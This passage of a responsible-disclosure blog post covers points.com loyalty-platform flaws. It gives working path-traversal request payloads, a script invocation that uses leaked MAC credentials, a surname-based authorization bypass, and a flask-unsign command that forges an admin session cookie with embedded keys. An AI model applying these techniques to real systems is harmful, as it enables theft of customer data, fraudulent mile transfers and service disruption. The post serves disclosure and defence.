<p>Based on our understanding of the LCP API OAuth 2.0 MAC authentication scheme, if these secondary context HTTP requests were directed towards the "lcp.points.com" host, they would need to be signed using the specific customers "macKey" and "macID" parameters.</p>
<p>The very strange and interesting thing, however, was that this HTTP request was able to generate authorization tokens for any rewards program. When we tried to do that ourselves using our provisioned "lcp.points.com" credentials, we received authorization errors saying that we did not have permission to access the specific route.</p>
<p>The first thing that came to mind after seeing that the HTTP request could generate authorization tokens for any rewards program was that the points.com United website (which was built and hosted by points.com) was using a "god token" as an authorization bearer that had access to all rewards programs when sending the HTTP request to generate the points.com member authorization token.</p>
<p>If this were the case and we could traverse the API, then we would be able to rewrite entire POST request to any "lcp.points.com" endpoint that had global permissions. Our new interest became finding an endpoint to traverse to so that we could test whether or not the HTTP request was indeed being signed by a "god token."</p>

<p>To test our theory that the secondary context API may be using an authorization token that had global permissions, we sought to find other endpoints that we could traverse to and overwrite the entire API call where we could control the entire HTTP request. After taking a list of endpoints from the LCP API documentation, we ran them through an intruder configuration which tested for the specific endpoint with an appended "?" to cut off the remaining path.</p>
<p>As an example, to try to find the right directory for "/api/example" we'd send the following "lpId" payloads:</p>
<pre><code><span>"lpId"</span><span>:</span><span>"/api/example?"</span>
<span>"lpId"</span><span>:</span><span>"../api/example?"</span>
<span>"lpId"</span><span>:</span><span>"../../api/example?"</span>
</code></pre>
<p>Eventually, we had our first 200 OK HTTP response for the following payload:</p>
<p><strong>HTTP Request</strong></p>
<pre><code>POST /mileage-plus-transfer/mvs/recipient HTTP/<span>1.1</span>
Host<span>:</span> buymiles.mileageplus.com
<span>{</span><span>"mvPayload"</span><span>:</span><span>{</span><span>}</span><span>,</span><span>"lpId"</span><span>:</span><span>"../../v1/search/orders/?"</span><span>}</span>
</code></pre>
<p><strong>HTTP Response</strong></p>
<pre><code>HTTP/<span>2</span> <span>400</span> Bad Request
Content-type<span>:</span> application/json

<span>{</span><span>"error"</span><span>:</span><span>"Missing query parameter"</span><span>}</span>
</code></pre>
<p>After seeing the missing query parameter, we attempted to fuzz the GET parameters via the "lpId" parameter by appending them (e.g. /v1/search/orders?query=x) but weren't able to identify anything. This puzzled us for a bit, then we realized that the "/v1/search/orders" endpoint was a POST request that took a JSON body.</p>
<p>We saw the empty parameter "mvPayload" that we were sending and attempted to fuzz for parameters within the JSON body. Our intruder script ran, and then we saw one that was successful with a huge response size! It appeared the parameter "q" was the parameter the server was looking for.</p>
<p>By sending the following POST request, we were able to access the transaction data for all points.com loyalty programs including Delta, Emirates, Singapore Airlines, United, Etihad, Air Canada, Lufthansa, Southwest, Alaska, Hawaiian, and additionally many hotel reward points providers like Hilton, Marriott, and IHG:</p>

<p>Once we saw the HTTP response, we immediately reported the issue. There were over 22 million records that we could query from various airlines and hotel rewards programs. It appeared that the "macKey" and "macID" signing the HTTP request was a sort of "god key" which had access to all rewards program data.</p>
<p>This vulnerability affected all <a href="https://www.points.com/partners/">nearly all points.com customers</a>.</p>
<h3 id="pointscom-catches-us">Points.com Catches Us</h3>
<p>Before we could even finish sending our report or see if other endpoints were accessible (e.g. adding points to a customer rewards account), the points.com team had detected our testing and had completely shut down United's production points.com website. Bummer! If we were malicious actors, we would've gotten caught trying to enumerate any significant number of records (the query returned 100 records per/request) via the exploit. The detection and response by the points.com team was seriously impressive.</p>
<p>After having tested the points.com infrastructure for a few days, we became increasingly interested in finding a vulnerability that would allow us to duplicate or generate unlimited miles. While the "buymiles.mileageplus.com" website was down, we began exploring the rest of the points.com infrastructure.</p>

<p>Amidst our testing on points.com assets, we discovered a website used by Virgin rewards customers to earn points when shopping on partner websites at "shopsaway.virginatlantic.com".</p>

<p>This website was interesting to us, because it was hosted by points.com and likely leveraged credentials by either points.com or Virgin to access information related to their program.</p>
<p>We ran discovery tools on the asset and found various PHP endpoints, including a "login1.php" endpoint which returned the following information:</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Within the HTTP response of the "login1.php" endpoint were what appeared to be a testing rewards member's profile information alongside various keys.</p>
<p>The keys disclosed included the customer's authorization token, but much more interestingly, the "macID" and "macKey" values for what we assumed were for Virgin's points.com production tenant account!</p>
<p>Based on our understanding of the "lcp.points.com" API, we could use those secrets to access the API on behalf of the airline. We sought out a way to validate this. After scouring the internet for a while, we discovered the following code which could be used to sign HTTP requests to the "lcp.points.com" API using the leaked credentials:</p>
<pre><code><span>if</span> __name__ == <span>'__main__'</span>:
    <span>if</span> <span>'-u'</span> <span>not</span> <span>in</span> sys.argv:
        exit(<span>"Usage: %s -u &lt;macKeyIdentifier&gt;:&lt;macKey&gt; [curl options...] &lt;url&gt;"</span> % os.path.basename(__file__))
</code></pre>
<p>Using code from the <a href="https://github.com/xnt/Loyalty-Commerce-Platform/blob/0d9878bc29bae7c42e808b19865f6b91e1a02079/util/lcp_curl.py#L4">above Github repository built to help sign HTTP requests to "lcp.points.com"</a>, we could use the following syntax to send Virgin signed HTTP requests to the "lcp.points.com" API:</p>
<pre><code>python lcp_curl.py -u MAC_ID:MAC_SECRET <span>"https://lcp.points.com/v1/search/orders/?limit=1000"</span>
</code></pre>
<p>After running the above script to sign an HTTP request on behalf of the Virgin program to "/v1/search/orders" endpoint, we received the following data back:</p>
<pre><code><span>{</span>
  <span>"orders"</span><span>:</span> <span>[</span>
    <span>{</span>

  <span>]</span><span>,</span>
  <span>"totalCount"</span><span>:</span> <span>"2032431"</span>
<span>}</span>
</code></pre>
<p>It worked!</p>
<p>This validated that the leaked credentials were valid and could be used to access the Virgin rewards program. An attacker could hit any of the "lcp.points.com" endpoints using these credentials, including administrative ones like adding/removing rewards points from customers, accessing customer accounts, and modifying tenant information related to the Virgin rewards program.</p>
<p>We reported the issue and the endpoint was removed within an hour.</p>

<p>On the United bug bounty program, there are a few domains that are explicitly out of scope including "mileageplus.com". Our guess why they're out of scope&nbsp; is that many of the "mileageplus.com" subdomains are actually powered by points.com.</p>
<p>One of the subdomains of this site is "widgets.unitedmileageplus.com" which acts as a sort of SSO service for United MileagePlus members to authenticate into apps like "buymiles.mileageplus.com" and "mpxadmin.unitedmileageplus.com".</p>

<p>After enumerating the subdomain with <a href="https://github.com/lc/gau">gau</a>, we identified that there were various login pages that would authenticate you into related MileagePlus apps.</p>
<p>Each of these login pages expected different arguments: some would ask you for a United MileagePlus number and password, while others would ask you for a username, password, and an answer to your security questions. There was one very odd form, where it only asked you for your MileagePlus number and last name.</p>

<p>We found that the token returned from each of the different authorization methods were identical in format to each other. We tested and found that it was possible to copy the token from the HTTP response where you authenticated using only your surname and MileagePlus number into the consumer endpoints from the more secure username, password, and security question endpoints and you would be authenticated into any of the applications!</p>
<p>This meant that there was an authorization bypass where we could skip logging into the account with the member credentials and instead only provide their name and MileagePlus number.</p>
<p>From an impact perspective, there were various apps that were accessible via this bypass including the "buymiles.mileageplus.com" which disclosed PII and allowed us to transfer miles to ourselves. We went ahead and used this exploit to transfer miles from one of our own accounts to another, demonstrating that it was indeed possible to transfer another user's miles using this authorization bypass.</p>

<p>The other much more interesting app that we could've (potentially) authenticated to was the "mpxadmin.unitedmileageplus.com" website. We were unable to confirm this because at the time of discovering the issue we didn't have the surname and a MileagePlus number of a United employee who may have had access to the app. If we did, we assume that it would've been possible and this level of access would allow us to manage the balances of customers, view transactions, and perform administrative actions for the MileagePlus rewards program.</p>

<h3 id="switching-back-to-hunting-on-the-pointscom-global-administration-console">Switching Back to Hunting on the Points.com Global Administration Console</h3>
<p>After realizing that we couldn't go much further impact wise hunting on the airline websites, we switched our focus back to the original website we found that was used by points.com employees and rewards program owners to administratively manage their customers and rewards programs.</p>
<p>From what we saw in the JavaScript on the "console.points.com" website, there were tons of endpoints that were only accessible to points.com employees. We tested these endpoints for a few more hours, trying and failing to find any sort of authorization bypass or way around the permission checks. After a little while longer of frustrated attempts to escalate our privileges, we zoomed out and realized something obvious that we had been overlooking the entire time...</p>

<p>After we finally stopped testing the APIs and looking for permission vulnerabilities, we realized that we'd totally forgotten to look at the session cookies!</p>
<p>Based on the format of the cookie, we could tell that it was some weird encrypted blob because on the JWT-looking format of it. It took us a little more poking but we eventually realized that the core app session token was a signed Flask session cookie.</p>

<p>We took the cookie and ran it through Ian Carroll's "<a href="https://github.com/iangcarroll/cookiemonster">cookiemonster</a>" tool. This tool would automatically guess secrets used for signing the cookie by attempting to unsign it with a wordlist of known secrets. After a few seconds, we had a response!</p>

<p>The Flask session secret for the website that was used by points.com employees to manage all rewards profiles, loyalty programs, and customer orders, was the word "secret". We could now theoretically sign our own cookie with whatever data we wanted, as long as the server wasn't including some unpredictable or signed piece of data within the cookie. We authenticated to the website and copied our session cookie over to flask-unsign to investigate the contents of the cookie:</p>
<pre><code><span>{</span><span>"_csrf_token"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"_fresh"</span><span>:</span> <span><span>true</span></span><span>,</span> <span>"_id"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"_user_id"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"sid"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"user"</span><span>:</span> <span>{</span><span>"authenticationType"</span><span>:</span> <span>"account"</span><span>,</span> <span>"email"</span><span>:</span> <span>"samwcurry@gmail.com"</span><span>,</span> <span>"feature_flags"</span><span>:</span> <span>[</span><span>"temp_resending_emails"</span><span>]</span><span>,</span> <span>"groups"</span><span>:</span> <span>[</span><span>]</span><span>,</span> <span>"id"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"mac_key"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"mac_key_identifier"</span><span>:</span> <span>"redacted"</span><span>,</span> <span>"roles"</span><span>:</span> <span>[</span><span>]</span><span>}</span><span>}</span>
</code></pre>
<p>Based on what we saw in the decrypted body of our cookie, there wasn't anything unpredictable that would stop us from tampering with the cookie. The "roles" and "groups" arrays appeared most fruitful for escalating privileges since we could now re-sign it with any data we wanted, so we went back through the app and attempted to find JavaScript which related to these fields.</p>
<p>The role which looked the most privileged based on the information we found in the JavaScript was the "configeditor" role. We added this to our cookie along with the "admin" group and resigned it using the following command:</p>
<pre><code>flask-unsign -s -S <span>"secret"</span> -c <span>"{'_csrf_token': 'bb2cf0e85b20f13dcfebecb436c91b160f392fa2555961c23b3fcc67775edc50', '_fresh': True, '_id': 'a76abcdda16ed36f131df6e5f30c7e9cf142131ebcd4c0706b4c05ec720006daeaef804fcd925743954f10c8a5b3e10018216585157c88e6aedaa8fb42702dd3', '_user_id': '8547961e-b122-4b42-a124-4169cfc86a94', 'sid': 'bd2e7256bf1011eda2410242ac11000a', 'user': {'authenticationType': 'account', 'email': 'samwcurry@gmail.com', 'feature_flags': ['temp_resending_emails', 'v2_manual_bonus_page', 'v2_request_for_reimbursements'], 'groups': ['admin'], 'id': '8547961e-b122-4b42-a124-4169cfc86a94', 'mac_key': 'blLWTn1VyhIWNPoAVC2X9-Iqsqei7pEPkgXjxnhRepg=', 'mac_key_identifier': '8d261003b476497e8be4c2c077d69b5f', 'roles': [{'role': 'https://lcp.points.com/v1/roles/configeditor'}]}}"</span>

<p>The command resigned our cookie with the "secret" key and gave us the following cookie:</p>

<p>After plugging this cookie in, we attempted to revisit the "console.points.com" website and saw a bunch of extra functionality. We were in and had full administrative privileges!</p>
<p>One page that immediately grabbed our attention was "Manual Bonus". After clicking it, we realized that it was capable of manually adding rewards points for any program to any rewards account. Jackpot!</p>

<p>Another fun bit of impact was the ability to modify the rewards exchange amounts through the Promos tab. We could update rewards programs to offer, for example, 100 million United miles in exchange for 1 Delta mile, or simply 1 million miles for every dollar spent on a particular program. Users would then be able to exchange their miles, giving them nearly unlimited miles.</p>

<p>Two other interesting pages on the "console.points.com" website were the Modules and Routes endpoints. An attacker could use this as intended to add malicious JavaScript to every page on the administration panel. If undetected, it would make for a super fun backdoor where an attacker's JavaScript would be loaded on every page of the administration website.</p>

<p>Since these were all production rewards customers, an attacker could temporarily shut down all rewards travel by modifying the key pairs used by each airline on the Platform Partners endpoint. Once the MAC ID and MAC key were overwritten, it would break the infrastructure used by airlines to communicate with points.com, meaning customers would be unable to book flights using airline miles.</p>

<p>Something important to note is that this administration panel was built for points.com employees to manage rewards programs at the tenant level. An attacker with this level of access could revoke the credentials used by the actual airline to provide service to their customers to access the API, thereby shutting down global rewards travel for that specific airline. In addition to accessing customer account information. There are many interesting scenarios in which a malicious attacker could've abused this access.</p>
<p>We reported the vulnerability and the points.com team responded almost immediately, even though our email was sent at 3:26 AM CST (sorry for hacking so late, both Ian and I were restless on a plane when we found this vulnerability!). The team understood the severity of the report and immediately took down the "console.points.com" website.</p>
<p>We attempted to bypass their fix via vhost hopping from the origin server IP with no luck. The site was completely taken down and the issue would be fixed shortly after.</p>
<h2 id="closing">Closing</h2>
<p>After submitting our last report to the points.com team, the overall findings had allowed us to access to customer information for a huge percentage of global rewards programs, transfer points on behalf of customers, and finally access the global administration panel. We had reported all issues to the points.com security team who very quickly patched them and worked with us in creating this disclosure.</p>
<p>This blog post, along with our other research (<a href="https://hackcompute.com/hacking-epp-servers/">taking over a dozen TLDs</a>; being able to <a href="https://samcurry.net/web-hackers-vs-the-auto-industry/">remotely unlock, locate, and sometimes disable over a dozen different auto manufacturers vehicles</a>) follows the theme of high impact vulnerability research where an attacker can compromise a single point of failure with widespread impact.</p>
